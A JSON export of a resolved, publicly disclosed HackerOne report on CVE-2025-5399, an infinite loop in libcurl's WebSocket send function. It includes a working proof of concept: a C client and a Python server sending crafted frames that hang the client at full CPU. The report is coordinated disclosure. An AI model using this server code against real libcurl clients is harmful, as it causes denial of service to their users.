{
  "id": 3168039,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTY4MDM5",
  "url": "https://hackerone.com/reports/3168039",
  "title": "CVE-2025-5399: WebSocket endless loop",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2025-05-30T03:38:19.322Z",
  "submitted_at": "2025-05-30T03:38:19.537Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "z2_",
    "url": "/z2_",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/5eld4c9eg34za1r92ipvd757pa9d/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2025-5399"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2025-06-04T05:57:17.156Z",
  "bug_reporter_agreed_on_going_public_at": "2025-06-04T05:57:16.995Z",
  "team_member_agreed_on_going_public_at": "2025-06-04T05:54:41.818Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The function `curl_ws_send()` in libcurl on commit [12d13b84fa40aa657b83d5458944dbd9b978fb7e](https://github.com/curl/curl/blob/12d13b84fa40aa657b83d5458944dbd9b978fb7e/lib/ws.c) contains an infinite loop that can be triggered by a malicious server under specific circumstances.\nIf an application uses `curl_ws_recv()` and `curl_ws_send()` to communicate with a websocket server, a malicious server can send a carefully timed PING message while the client is constructing a frame via `CURLWS_OFFSET` that leads to the next `curl_ws_send()` invocation not terminating a loop that flushes data.\n\nThe affected code is in file `lib/ws.c` in function `curl_ws_send()` on [lines 1376 - 1419](https://github.com/curl/curl/blob/12d13b84fa40aa657b83d5458944dbd9b978fb7e/lib/ws.c#L1376):\n```c\nwhile(!Curl_bufq_is_empty(&ws->sendbuf) || (buflen > ws->sendbuf_payload)) {\n    // ...\n    \n    result = ws_flush(data, ws, Curl_is_in_callback(data));\n    if(!result) {\n      *sent += ws->sendbuf_payload;\n      buffer += ws->sendbuf_payload;\n      buflen -= ws->sendbuf_payload;\n      ws->sendbuf_payload = 0;\n    }\n    \n    // ...\n}\n```\n`buflen` is coming from the application and is the length of data to be sent. If the loop starts with `ws->sendbuf_payload == 0`, then\n`buflen > ws->sendbuf_payload` is always true. After a successful `ws_flush()`, `sent`, `buffer` and `buflen` remain unmodified and the loop\nruns forever.\n\n## PoC\nConsider the following client that repeatedly sends and receives messages:\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <assert.h>\n#include <curl/curl.h>\n\nint main (int argc, char** argv) {\n    char buffer[512];\n    size_t sent;\n    size_t n;\n    const struct curl_ws_frame* meta;\n    CURLcode res;\n    \n    CURL* curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"ws://127.0.0.1:1337/\");\n    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 2L);\n    curl_easy_perform(curl);\n    \n    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);\n    curl_ws_send(curl, \"1234\", 4, &sent, 0, CURLWS_TEXT | CURLWS_CONT);\n    \n    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);\n    curl_ws_send(curl, \"X\", 1, &sent, 70, CURLWS_OFFSET);\n    \n    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);\n    curl_ws_send(curl, buffer, 53, &sent, 0, CURLWS_OFFSET);\n    \n    // The next curl_ws_recv() will receive a 16-byte PING message and\n    // auto-respond with PONG\n    \n    res = curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);\n    assert(res == CURLE_AGAIN);\n    \n    // Restart I/O. The next call to curl_ws_send() will never return\n    \n    curl_ws_recv(curl, buffer, sizeof(buffer), &n, &meta);\n    curl_ws_send(curl, buffer, 16, &sent, 0, CURLWS_OFFSET);\n    \n    // never reached:\n    assert(0);\n}\n```\n\nAnd consider the following server that serves malicious packets:\n```py\n#!/usr/bin/env python3\n\nimport time\nimport base64\nimport hashlib\nfrom pwn import *\n\npackets = [\n    b'\\x01~\\x00\\x0cHello World!',\n    b'\\x89F\\x9a',\n    b\"\\xb1\\x8b\\xe3\\x8f\\xa6\\xe29\\xe4\\xa6(\\x04P\\x06'\\xccwa\\xd1\\x83+\\xbc\\xf1\\xd1\\x9f\\x93\\xdc\\xf4(Y\", \n    b'\\x81\\x10\\xb8\\xd7b\\xbc\\xcfcM\\x992\\x1fU\\xc1\\x8f\\xc7\\x07\\xc92S\\x06\\xdc\\xd9\\xc7',\n    b'\\x01~\\x00\\x0cHello World!',\n    b'\\x88g\\xe5\\xef\\x88\\x00\\xeb7\\xc2D\\xa6\\x812\\xb3\\x98\\x9b/\\xa6',\n    b'4U3T\\xba\\xb9\\xd3\\x81\\xeb\\x17\\xd19(\\x92g\\x8d\\x85)\\x8f\\xec\\xf3\\x14@',\n    b'\\x8b\\xc2\\xf5\\xf3\\x10\\xf4\\x19\\xe8\\x0f\\x08\\x98\\x9d'\n]\n\ndef sha1(data):\n    h = hashlib.new(\"sha1\")\n    h.update(data)\n    return h.digest()\n\nwith listen(1337) as conn:\n    conn.wait_for_connection()\n    key = None\n    \n    while True:\n        line = conn.recvline()\n        \n        if line.startswith(b\"Sec-WebSocket-Key: \"):\n            _, enc = line.split(b\" \")\n            key = enc.strip()\n        elif line == b\"\\r\\n\":\n            break\n    \n    key += b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"\n    \n    conn.sendline(b\"HTTP/1.1 101 Switching Protocols\\r\")\n    conn.sendline(b\"Upgrade: websocket\\r\")\n    conn.sendline(b\"Sec-WebSocket-Accept: \" + base64.b64encode(sha1(key)) + b\"\\r\")\n    conn.sendline(b\"Sec-WebSocket-Version: 13\\r\")\n    conn.sendline(b\"\\r\")\n    \n    for packet in packets:\n        conn.send(packet)\n```\n\nWhen the server is launched in the background with\n```\n$ python3 server.py &\n```\nAnd the client is run with\n```\n$ ./client\n```\nit can be seen that `./client` takes up 100% CPU usage and never terminates.\n\n## Explanation\nI still don't 100% understand the websocket code and why it comes to this bug but here is a rough overview\nwhat happens:\n\n- The client tries building a 70-byte frame over the course of 3 `curl_ws_send()` invocations\n- The first two invocations supply 1 + 53 = 54 bytes\n- Then a PING arrives with 16 bytes of content\n- Upon serving the final 16-bytes from the application, the loop occurs\n\nIf the auto-pong feature is deactivated via\n```c\ncurl_easy_setopt(curl, CURLOPT_WS_OPTIONS, (long) CURLWS_NOAUTOPONG);\n```\nthe infinite loop no longer occurs. The root-cause seems to be in the handling\nof the PING message.\n\n## Impact\n\nSince this bug\n- can be triggered by a remote server\n- makes programs halt their execution and consumes 100% CPU over an indefinite amount of time\n- only occurs when the client behaves in a very specific way\n\nI suggest severity \"Low\".",
  "weakness": {
    "id": 949,
    "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2025-07-04T05:54:42.072Z",
  "allow_singular_disclosure_after": -49956.347816939,
  "singular_disclosure_allowed": true,
  "vote_count": 55,
  "voters": [
    "aboalezz",
    "z2_",
    "almuntadhar",
    "zy9ard3",
    "alejandroar",
    "2026",
    "mohaned0101",
    "neilx",
    "bate5a",
    "mr-alienx-kurd",
    "and 45 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
